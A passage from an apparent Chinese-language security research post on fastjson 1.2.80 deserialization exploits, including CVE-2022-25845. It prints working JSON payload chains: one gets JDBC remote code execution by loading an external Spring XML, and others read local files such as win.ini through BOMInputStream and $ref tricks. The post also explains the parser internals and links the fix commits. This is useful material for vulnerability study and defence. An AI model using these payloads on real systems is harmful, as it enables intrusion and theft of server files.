</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>å‚è€ƒçš„y4</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;a&#34;</span><span class="p">:{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;java.lang.Exception&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;org.python.antlr.ParseException&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;type&#34;</span><span class="p">:{}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;b&#34;</span><span class="p">:{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;org.python.core.PyObject&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;com.ziclix.python.sql.PyConnection&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;connection&#34;</span><span class="p">:{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;org.postgresql.jdbc.PgConnection&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;hostSpecs&#34;</span><span class="p">:</span><span class="o">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;host&#34;</span><span class="p">:</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;port&#34;</span><span class="p">:</span><span class="n">2333</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">]</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;user&#34;</span><span class="p">:</span><span class="s">&#34;user&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;database&#34;</span><span class="p">:</span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;info&#34;</span><span class="p">:{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;socketFactory&#34;</span><span class="p">:</span><span class="s">&#34;org.springframework.context.support.ClassPathXmlApplicationContext&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;socketFactoryArg&#34;</span><span class="p">:</span><span class="s">&#34;http://127.0.0.1:8090/exp.xml&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;url&#34;</span><span class="p">:</span><span class="s">&#34;&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿™ä¸ªåˆ©ç”¨å¾ˆçŒ›å•Š</p>
<blockquote>
<p>æµç¨‹ï¼š</p>
<p>put Exception</p>
<p>åŠ è½½ParseExceptionï¼ˆexpectClassï¼šException</p>
<p>è§¦å‘ParseException#setType &ndash;&gt; put PyObject</p>
<p>åŠ è½½PyConnectionï¼ˆexpectClass PyObject</p>
<p>è§¦å‘PyConnectionè‡ªæ„æ–¹æ³• &ndash;&gt; put Connection //è¿™é‡Œè¿˜æ²¡åˆ°è°ƒç”¨è‡ªæ„æ–¹æ³•é‚£ä¸ï¼Œè¿™é‡Œè¦å…ˆå¯¹å€¼è¿›è¡Œ<code>è¿˜åŸ</code>å³&quot;connection&quot;:{&hellip;}ï¼Œè€Œè¿™é‡Œä¼šå…ˆå¤„ç†<code>connection</code>ï¼Œæ‰€ä»¥åŠ è½½PgConnectionæ—¶ï¼ŒConnection ä¸ºexpectClass</p>
<p>åŠ è½½PgConnectionï¼ˆexpectClass Connection //<code>PGConnection</code>æ˜¯å¦ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥è¿™é‡Œè¦åˆ©ç”¨<code>Connection</code></p>
<p>è§¦å‘PgConnectionè‡ªè´­æ–¹æ³• &ndash;&gt; jdbc rce</p>
</blockquote>
<blockquote>
<p>é‚£èƒ½ä¸èƒ½è¿™æ ·æ„é€ å‘¢ï¼Œè¿™æ ·è²Œä¼¼æ›´å¥½ç†è§£ï¼Œç†è®ºä¸Šæ˜¯å¯ä»¥çš„ï¼Œåªæ˜¯connectionè¿™ä¸ªå‚æ•°è¿™ä¸ªå€¼ä¸ºä¸‹é¢è¿™ä¸ªçš„è¯ï¼Œ<code>PyConnection</code>è‡ªè´­çš„æ—¶å€™ä¼š<code>å¼‚å¸¸</code></p>
<p>{
&ldquo;a&rdquo;:{&hellip;
},
&ldquo;b&rdquo;:{&hellip;.
&ldquo;connection&rdquo;:{}
},
&ldquo;c&rdquo;:{
&ldquo;@type&rdquo;:&ldquo;java.sql.Connection&rdquo;,
&ldquo;@type&rdquo;:&ldquo;org.postgresql.jdbc.PgConnection&rdquo;,
&hellip;
}
}</p>
</blockquote>
<p>å…³äº<strong>fieldè¿›è¡Œå®ä¾‹åŒ–</strong>è¿™ä¸ªç‰¹æ€§<code>JavaBeanDeserializer</code>åŒæ ·å­˜åœ¨ï¼Œåˆå§‹åŒ–å®Œå‚æ•°å<code>PgConnection</code>è°ƒç”¨è‡ªè´­æ–¹æ³•ï¼Œè§¦å‘jdbc</p>
<p><img loading="lazy" src="images/image-20250529174930993.png" alt="image-20250529174930993"  />
</p>
<h3 id="ä¿®å¤-1">ä¿®å¤<a hidden class="anchor" aria-hidden="true" href="#ä¿®å¤-1">#</a></h3>
<ol>
<li><a href="https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d">https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d</a></li>
<li><a href="https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15">https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15</a></li>
</ol>
<p>é™¤äº†é»‘ç™½åå•çš„å˜åŒ–ä»¥å¤–å°±æ˜¯ç›´æ¥ç«¯æ‰<code>å¼‚å¸¸ç±»</code>è¿™æ¡è·¯ã€‚</p>
<p><a href="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/8d892d77-74bb-0a2e-f693-9a2f5f59c158.png"><img loading="lazy" src="images/8d892d77-74bb-0a2e-f693-9a2f5f59c158.png" alt="image.png"  />
</a></p>
<p>å¹¶ä¸”åœ¨åŠ ç±»ç¼“å­˜æ—¶å¤šäº†ä¸€æ¬¡autotypeåˆ¤æ–­</p>
<p>expectClasså’ŒjsonTypeéƒ½éœ€è¦å¼€å¯</p>
<p><img loading="lazy" src="images/image-20250529104343847.png" alt="image-20250529104343847"  />
</p>
<h2 id="cve-2022-25845">CVE-2022-25845<a hidden class="anchor" aria-hidden="true" href="#cve-2022-25845">#</a></h2>
<p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">https://github.com/luelueking/CVE-2022-25845-In-Spring</a></p>
<p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf</a></p>
<p>è¿™é‡Œç”¨çš„@1ueå¸ˆå‚…çš„pocï¼Œè·Ÿè®®ä¼šä¸Šçš„pocæ„é€ å¯èƒ½æœ‰ç‚¹å·®å¼‚å§ï¼Œä¸è¿‡åˆ©ç”¨ç‚¹æ˜¯ä¸€æ ·çš„</p>
<blockquote>
<p>è¿™ä¸ªåˆ©ç”¨åœ¨1.2.80é‡Œæˆ‘è§‰å¾—æ˜¯<code>å®ç”¨æ€§</code>å¾ˆå¥½çš„pocäº†ï¼Œè¿™é‡Œä¸»è¦éœ€è¦3ä¸ªä¾èµ–å§</p>
<ul>
<li>commons-io //ç”¨æ¥è¯»å†™æ–‡ä»¶</li>
<li>fastjson   //ä¸ç”¨å¤šè¯´ï¼Œè§¦å‘åˆ©ç”¨</li>
<li>springboot //è¿™ä¸ªå…¶å®æ˜¯å› ä¸ºä¼šå¯åŠ¨æ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ª<code>tomcatçš„ä¸´æ—¶ç›®å½•</code>ï¼Œè€Œ<code>TomcatEmbeddedWebappClassLoader</code>åŠ è½½<code>Class</code>æ—¶ï¼Œä¼šåœ¨ä¸Šè¿°ç›®å½•<code>å¯¹åº”è·¯å¾„</code>ä¸‹æŸ¥æ‰¾classæ–‡ä»¶ï¼Œå­˜åœ¨çš„è¯å°±ä¼šåŠ è½½è¿™ä¸ªclassæ–‡ä»¶è§¦å‘<code>staticå—ä»£ç æ‰§è¡Œ</code></li>
</ul>
<p>æ‰€ä»¥è¿™ä¸‰ä¸ªä¾èµ–å°±é€ å°±è¿™ä¸ªamazingçš„åˆ©ç”¨</p>
<ol>
<li>put java.io.InputStream ä¾¿äºåç»­çš„è°ƒç”¨</li>
<li>å› ä¸ºtomcatè¿™ä¸ªç›®å½•åï¼Œå¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè€Œæ˜¯éšæœºçš„ï¼Œä½†æ˜¯åœ¨javaä¸­<code>fileåè®®</code>å¯ä»¥ç”¨æ¥<code>éå†ç›®å½•</code>æ‰€ä»¥è¿™é‡Œæˆ‘å¯ä»¥é€šè¿‡<code>file:///tmp</code>æ‰¾åˆ°ç”Ÿæˆ<code>tomcatä¸´æ—¶ç›®å½•</code>çš„åå­—</li>
<li>åŠå†™å…¥æ„é€ å¥½çš„classæ–‡ä»¶åˆ°tomcatä¸´æ—¶ç›®å½•ä¸‹ï¼Œä¸”è¿™ä¸ªå¯ä»¥è§£å†³ç›®å½•åˆ›å»ºçš„é—®é¢˜</li>
<li>é€šè¿‡fastjsonè§¦å‘classåŠ è½½ï¼Œè§¦å‘static{}æ‰§è¡Œ //è¿™é‡ŒfastjsonåŠ è½½ç±»æ—¶ï¼Œä¼šç”¨åˆ°<code>TomcatEmbeddedWebappClassLoader</code>åŠ è½½ï¼Œæ‰€ä»¥èƒ½åŠ è½½tomcatä¸´æ—¶ç›®å½•çš„classã€‚éƒ½æ˜¯ç¯ç¯ç›¸æ‰£çš„åˆ©ç”¨ï¼ŒæŒºæœ‰æ„æ€çš„</li>
</ol>
</blockquote>
<h3 id="step1-put-javaioinputstream">Step1: put java.io.InputStream<a hidden class="anchor" aria-hidden="true" href="#step1-put-javaioinputstream">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;{    \&#34;@type\&#34;: \&#34;java.lang.Exception\&#34;,    \&#34;@type\&#34;: \&#34;com.fasterxml.jackson.core.exc.InputCoercionException\&#34;,    \&#34;p\&#34;: {    }  }&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;$.a.a&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;c&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;{  \&#34;@type\&#34;: \&#34;com.fasterxml.jackson.core.JsonParser\&#34;,  \&#34;@type\&#34;: \&#34;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&#34;,  \&#34;in\&#34;: {}}&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;d&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;$.c.c&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œè§£é‡Šä¸‹<code>pocæ„é€ å†™æ³•</code>å§ï¼Œå¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯<code>&quot;a&quot;:&quot;...&quot;</code>è¿™ç§è€Œä¸æ˜¯<code>&quot;a&quot;:{...}</code>ï¼Œä¸ºä»€ä¹ˆè¿™æ ·æ„é€ å‘¢ï¼ˆæµ‹è¯•ä¸¤ç§pocéƒ½æ˜¯èƒ½<code>putæˆåŠŸ</code>çš„ï¼‰ï¼Œæ„Ÿè§‰æ˜¯å¾®æ“(å°±æ˜¯ä¸æŠ¥é”™ï¼Œè®°å½•æ—¥å¿—çš„æ—¶å€™æ˜¯æ­£å¸¸çš„ï¼Œå¯ä»¥çœ‹åˆ°ä½œè€…çš„pocæ˜¯200ï¼Œè€Œé€šå¸¸çš„åˆ©ç”¨æ˜¯500ï¼ˆå¦‚æœæ˜ç™½è¿™ä¸ª<code>ç‰¹å¾</code>æ‰¾æ—¥å¿—å°±å¾ˆå¥½<code>å®šä½</code></p>
<p>200</p>
<p><img loading="lazy" src="images/image-20250530110301110.png" alt="image-20250530110301110"  />
</p>
<p>500</p>
<p><img loading="lazy" src="images/image-20250530110247325.png" alt="image-20250530110247325"  />
</p>
<h4 id="refçš„åˆ©ç”¨">$refçš„åˆ©ç”¨<a hidden class="anchor" aria-hidden="true" href="#refçš„åˆ©ç”¨">#</a></h4>
<blockquote>
<p>ç®€è¿°ï¼šé€šè¿‡<code>parse.parse()</code>ä¼šè¿˜åŸæˆä¸€ä¸ª<code>map{String,String}</code>,ç„¶å<code>parser.handleResovleTask(value);</code>ä¼šå»æŸ¥æ‰¾å…¶ä¸­çš„<code>$ref</code>å¹¶è¿›è¡Œè°ƒç”¨ï¼Œ<code>$.a</code>å¾ˆå¥½ç†è§£å°±æ˜¯è·å–åˆ°{&ldquo;a&rdquo;:&quot;&hellip;&ldquo;å¯¹åº”çš„<code>å­—ç¬¦ä¸²</code>ï¼Œè€Œ<code>$.a.a</code>å°±æ˜¯åˆ©ç”¨çš„å…³é”®ï¼Œåœ¨å¯»æ‰¾æ—¶ä¼šåˆ¤æ–­<code>$.a</code>çš„<code>ç±»å‹</code>ï¼Œæ˜¯<code>String</code>çš„è¯ä¼šè¿›è¡Œ<code>JSON.parse()</code>ååºåˆ—åŒ–å…¶å€¼ï¼Œï¼ˆæ­£å¸¸æƒ…å†µæ˜¯å¾—åˆ°ä¸€ä¸ªmapç„¶åå†åœ¨è¿™ä¸ªmapä¸­è·å–$.a.<code>{a}</code>{}ä¸­è¿™ä¸ªå€¼(è¿™é‡Œæ˜¯a)ã€‚è€Œæˆ‘ä»¬è¿™<code>JSON.parse()</code>ä¼š<code>catch</code>ï¼ˆè¿™é‡Œç›¸å…³å¤„ç†æ˜¯{}<code>è·³è¿‡</code>ï¼‰ï¼Œç„¶ååç»­å¤„ç†ä¹Ÿæ²¡èµ‹ä¸Šå€¼&ndash;&gt;æœ€å<code>return null</code>ã€‚<code>$.a.a</code>å³æ˜¯<code>null</code>ï¼Œ</p>
<p>soï¼šè¿™é‡Œ$.a.aå¯ä»¥æ˜¯<code>$.a.{ä»»ä½•å€¼}</code>ï¼Œåªæ˜¯ç”¨æ¥è§¦å‘<code>$.açš„ååºåˆ—åŒ–</code></p>
</blockquote>
<p>handleResovleTaskè°ƒç”¨$ref</p>
<p><img loading="lazy" src="images/image-20250530110807633.png" alt="image-20250530110807633"  />
</p>
<p>ç¬¬ä¸€æ¬¡è¿›å…¥getPropertyValue()ï¼ŒæŸ¥æ‰¾<code>$.a</code>ï¼Œå½“å‰currentObjectå¯¹åº”æ•´ä¸ªjson{&ldquo;a&rdquo;,&hellip;}(å³$)</p>
<p><img loading="lazy" src="images/image-20250530111247255.png" alt="image-20250530111247255"  />
</p>
<p>ç¬¬äºŒæ¬¡è¿›å…¥getPropertyValue()ï¼ŒæŸ¥æ‰¾<code>$.a.a</code>ï¼ŒcurrentObjectå¯¹åº”<code>$.a</code>ï¼Œ<code>JSON.parse()</code>è§¦å‘åˆ©ç”¨</p>
<p><img loading="lazy" src="images/image-20250530105330412.png" alt="image-20250530105330412"  />
</p>
<h3 id="step2æ–‡ä»¶è¯»å–">Step2ï¼šæ–‡ä»¶è¯»å–<a hidden class="anchor" aria-hidden="true" href="#step2æ–‡ä»¶è¯»å–">#</a></h3>
<h4 id="getbom">getBom()<a hidden class="anchor" aria-hidden="true" href="#getbom">#</a></h4>
<p>çœ‹è¿™ä¸ªä¹‹å‰å¯ä»¥å…ˆçœ‹çœ‹è¿™ç¯‡ï¼Œæ ¸å¿ƒåˆ©ç”¨<code>getBom()</code></p>
<p><a href="https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ">https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ</a></p>
<blockquote>
<p>åˆ©ç”¨éœ€è¦çŸ¥é“<code>getBom()</code>çš„<code>è¿”å›å€¼</code>ï¼Œç„¶åæµ…è“è¿™é‡Œä¸¾ä¾‹äº†å‡ ç§å¯èƒ½çš„åœºæ™¯æ„Ÿè§‰æŒºä¸é”™çš„</p>
<ol>
<li>
<p>ä¸€å¤„ä¿®æ”¹æ˜µç§°nameçš„åŠŸèƒ½ï¼Œé€šè¿‡refå°†<code>getBom()</code>çš„è¿”å›å€¼èµ‹äºˆnameï¼Œç„¶åæŸ¥çœ‹<code>name</code>å€¼ï¼Œåˆ¤æ–­è¯»å–å†…å®¹</p>
</li>
<li>
<p>åŒä¸Šï¼Œä½†æ˜¯åˆ¤æ–­èµ‹å€¼ä¸º<code>ç©º</code>æ—¶<code>æŠ¥é”™</code>ï¼Œä¸ä¸ºç©º<code>æ­£å¸¸</code>ï¼Œå¸ƒå°”åˆ¤æ–­äº†</p>
</li>
<li>
<p>æ²¡æœ‰ä¸Šè¿°è¿™ç§å¥½ç”¨çš„<code>nameè§‚å¯Ÿç‚¹</code>äº†ï¼Œé€šè¿‡<code>ç±»å‹é”™è¯¯</code>å¯¼è‡´<code>fastjsonæŠ¥é”™</code>ï¼Œæ ¹æ®æŠ¥é”™åˆ¤æ–­ï¼Œ<code>&quot;java.lang.String&quot;{&quot;$ref&quot;:&quot;$.abc.BOM[0]&quot;}</code>ï¼Œnullæ—¶ä¸æŠ¥é”™ï¼Œæ¯”å¯¹æˆåŠŸæ—¶è¿”å›<code>ç±»å‹é”™è¯¯</code>æŠ¥é”™</p>
</li>
<li>
<p>æ²¡æœ‰ä»»ä½•æŠ¥é”™å›æ˜¾æ—¶ï¼Œå¯ä»¥åœ¨<code>ç±»å‹åˆ¤æ–­</code>åé¢å¢åŠ ä¸€ä¸ª<code>dnslog</code>ï¼ŒæŠ¥é”™æ—¶å¼‚å¸¸å¯¼è‡´åé¢çš„<code>dnslog</code>è¯·æ±‚ä¸äº†ï¼ˆä½†æ˜¯å®æˆ˜çš„è¯æ„Ÿè§‰å¾ˆé¸¡è‚‹ï¼‰</p>
<p>ä¸è¿‡è¿™ç§æ€è·¯åœ¨<code>ç‰ˆæœ¬æ¢æµ‹</code>æ•ˆæœè¿˜ä¸é”™ï¼Œå°±æ˜¯å¼•ç”¨å‡ ä¸ªå…³é”®ç‰ˆæœ¬ç‚¹å½¢æˆçš„pocè¿›è¡Œdnslogè¯·æ±‚ï¼ˆå…·ä½“å¯ä»¥çœ‹@su18æ€»ç»“çš„</p>
</li>
</ol>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.io.InputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.BOMInputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;delegate&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.BOMInputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;delegate&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.ReaderInputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;reader&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;jdk.nashorn.api.scripting.URLReader&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;url&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;file:///C:/Windows/win.ini&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;1024&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;boms&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;bytes&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">59</span><span class="p">,</span><span class="n">32</span><span class="p">,</span><span class="n">102</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;boms&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;bytes&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="s">&#34;$.a.delegate&#34;</span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250530180944330.png" alt="image-20250530180944330"  />
</p>
<p><img loading="lazy" src="images/image-20250530180922690.png" alt="image-20250530180922690"  />
</p>
<blockquote>
<p>é€šè¿‡çˆ†ç ´æ¯”å¯¹ä½æ•°æ®è¿›è¡Œè·å–çš„</p>
<p>åœ¨<code>parse.parse()</code>ååºåˆ—åŒ–åï¼Œè®¾ç½®<code>Response</code>å€¼æ—¶å»è·å–BOMå€¼ï¼Œè§¦å‘<code>getBOM()</code>ï¼Œç„¶åä¼šå’Œin(<code>ReaderInputStream</code>)è¯»å–åˆ°çš„å€¼å’ŒåŸæœ¬è®¾ç½®çš„<code>boms</code>è¿›è¡Œæ¯”å¯¹ï¼Œ<code>å…¨éƒ¨ä¸€è‡´</code>åˆ™ä¼šè¿”å›å…¶byte[]ï¼Œå¦åˆ™è¿”å›<code>null</code></p>
<p>è¿™ä¹Ÿå°±èƒ½é€šè¿‡<code>Response</code>åˆ¤æ–­æ–‡ä»¶å†…å®¹äº†</p>
</blockquote>
<p><img loading="lazy" src="images/image-20250530175549725.png" alt="image-20250530175549725"  />
</p>
<p><img loading="lazy" src="images/image-20250530175744376.png" alt="image-20250530175744376"  />
</p>
<p>ä½†æ˜¯å…¶å®æ²¡å¿…è¦å¤šå¥—ä¸€å±‚å•Šï¼Œæœ¬èº«å°±èƒ½é€šè¿‡<code>$ref</code>è§¦å‘<code>getBom()</code>ï¼Œä¸”èƒ½è¿”å›å¯¹åº”å›æ˜¾</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.io.InputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.BOMInputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;delegate&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.ReaderInputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;reader&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;jdk.nashorn.api.scripting.URLReader&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;url&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;file:///C:/Windows/win.ini&#34;</span><span class="c1">//${file}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;1024&#34;</span><span class="w">
